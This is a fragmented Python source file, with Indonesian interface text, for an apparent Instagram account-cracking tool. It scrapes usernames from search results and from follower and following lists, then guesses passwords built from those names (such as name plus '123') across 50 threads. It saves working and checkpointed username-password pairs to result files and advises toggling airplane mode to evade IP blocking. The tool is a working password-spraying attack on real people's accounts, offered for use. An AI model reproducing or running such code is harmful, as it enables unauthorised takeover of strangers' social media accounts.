...
/ _| / _/ _` / _` / _` | 
\__|_\__\__,_\__,_\__,_|{C}

Selamat datang {H}{nama}{C}

 {M}>{C} Username: {self.username}
 {M}>{C} Followers: {followers}
 {M}>{C} Following: {following}

 01{U}}}{C} Crack pencarian nama
 02{U}}}{C} Crack dari followers
 03{U}}}{C} Crack dari following
 ...
 [{U}>{C}] Anda bisa melaporkan langsung ke wa admin {H}089647787050{C}
 [{U}>{C}] #Salam dari admin tidak wibu
		""")
		exit()
 ...
 [{U}>{C}] Fix bug:
   ...
   -Untuk fitur bot komen masih dalam perbaikan
	...
	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://www.instagram.com/web/search/topsearch/?count=5000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
 ...
 [{M}!{C}] Jika alamat IP terkena spam hidupkan mode pesawat selama 10 detik
		""")
		with ThreadPoolExecutor(max_workers=50) as shinkai:
			for i in user:
				try:
					pw=[]
					pwd=i.split("|")[0]
					...
					if o=="1":
						...
						password=[pws[0]+"123",pwm]
					elif o=="3":
						password=[pws[0]+"123",pwm,pwx]
					shinkai.submit(self.crackAPI,pwd,password,uaAPI)
				except:
					pass
		exit(f'\n\n [{U}#{C}] Crack selesai...')
	...
	def APIinfo(self,user):
		...
		return nama,pengikut,mengikut

	def crackAPI(self,user,pas,uaAPI):
		global loop
		sys.stdout.write(f"\r [*] [{U}crack{C}] {loop}/{len(internal)} - OK-:{len(success)} - CP-:{len(checkpoint)} "),
		sys.stdout.flush()
		try:
			for pw in pas:
				...
				s.headers.update({'X-CSRFToken': token.cookies['csrftoken']})
				param={
                                        "username": user,
				...
				x_jason=json.loads(x.text)
				s.headers.update({'X-CSRFToken': x.cookies['csrftoken']})
				if "userId" in str(x_jason):
					nama,pengikut,mengikut=self.APIinfo(user)
					print(f"""\r [{H}+{C}] {H}SUCCESS LOGIN{C}:                 	
  {H}|{C}
  {H}├╴>{C} FullName: {H}{nama}{C}
  {H}├╴>{C} Username: {H}{user}{C}
  {H}├╴>{C} Password: {H}{pw}{C}
  {H}├╴>{C} Followers: {H}{pengikut}{C}
  {H}├╴>{C} Following: {H}{mengikut}{C}
					""")
					...
					nama,pengikut,mengikut=self.APIinfo(user)
					print(f"""\r [{O}+{C}] {O}CHECKPOINT LOGIN{C}:              	
  {O}|{C}
  {O}├╴>{C} FullName: {O}{nama}{C}
  {O}├╴>{C} Username: {O}{user}{C}
  {O}├╴>{C} Password: {O}{pw}{C}
  {O}├╴>{C} Followers: {O}{pengikut}{C}
  {O}├╴>{C} Following: {O}{mengikut}{C}
					""")
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break

				elif 'Подождите несколько минут, прежде чем пытаться снова.' in str(x.text):
  ...
  {O}├╴>{C} Following: {O}{mengikut}{C}
	...
	def menu(self):
		...
		if c=='':
			...
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=5000',id)
			...
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=5000',id)
			self.passwordAPI(info)
			...
			print(f'\n [{U}+{C}] Total result crack {H}{len(g)}{C}')
			...
			for s in g:
				...
				if xc=="checkpoint":
					print(f"""
 [{O}+{C}] {O}CHECKPOINT LOGIN{C}:
  {O}|{C}
  {O}├╴>{C} Username: {O}{usr}{C}
  {O}├╴>{C} Password: {O}{pwd}{C}
  {O}├╴>{C} Followers: {O}{fol}{C}
  {O}├╴>{C} Following: {O}{ful}{C}
					""");sleep(0.05)
				else:
					print(f"""
 [{H}+{C}] {H}SUCCESS LOGIN{C}:
  {H}|{C}
  {H}├╴>{C} Username: {H}{usr}{C}
  {H}├╴>{C} Password: {H}{pwd}{C}
  {H}├╴>{C} Followers: {H}{fol}{C}
  {H}├╴>{C} Following: {H}{ful}{C}
					""");sleep(0.05)
		elif c in ('6','06'):
			global following
			six=0
			...
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=5000',x_id)
			for i in following:
				six+=1
